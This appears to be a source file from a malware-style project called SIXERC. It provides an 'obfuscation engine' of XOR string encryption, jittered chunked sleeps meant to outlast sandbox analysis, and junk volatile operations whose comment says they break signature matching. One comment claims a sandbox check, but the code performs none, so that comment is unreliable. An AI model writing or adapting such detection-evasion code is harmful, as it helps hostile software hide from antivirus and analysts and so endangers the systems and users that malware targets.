// ============================================================================
// SIXERC — Obfuscation Engine
// ============================================================================

#include "core/obfuscation.hpp"
#include "core/utils.hpp"
#include <random>
#include <thread>
#include <chrono>
#include <windows.h>

namespace sixerc::obf {

std::string xor_decrypt(const std::string& data, uint8_t key) {
    std::string result = data;
    for (auto& c : result) {
        c ^= key;
    }
    return result;
}

std::string xor_encrypt(const std::string& data, uint8_t key) {
    return xor_decrypt(data, key); // XOR is symmetric
}

void stealth_sleep(uint32_t base_ms) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<uint32_t> jitter(500, 5000);
    std::uniform_int_distribution<uint32_t> split(3, 8);
    
    uint32_t total = base_ms + jitter(gen);
    uint32_t parts = split(gen);
    uint32_t per_part = total / parts;
    
    for (uint32_t i = 0; i < parts; ++i) {
        // Check if we're being emulated/sandboxed by doing a cheap computation
        volatile uint64_t dummy = 0;
        for (int j = 0; j < 1000; ++j) {
            dummy += j * 0xDEADBEEF;
        }
        (void)dummy;
        
        std::this_thread::sleep_for(std::chrono::milliseconds(per_part));
    }
}

void junk_marker() {
    // Volatile operations that do nothing meaningful but break pattern matching
    volatile int x = 0x1337;
    volatile int y = 0xC0FFEE;
    x ^= y;
    y ^= x;
    x ^= y;
    (void)x;
    (void)y;
}

} // namespace sixerc::obf
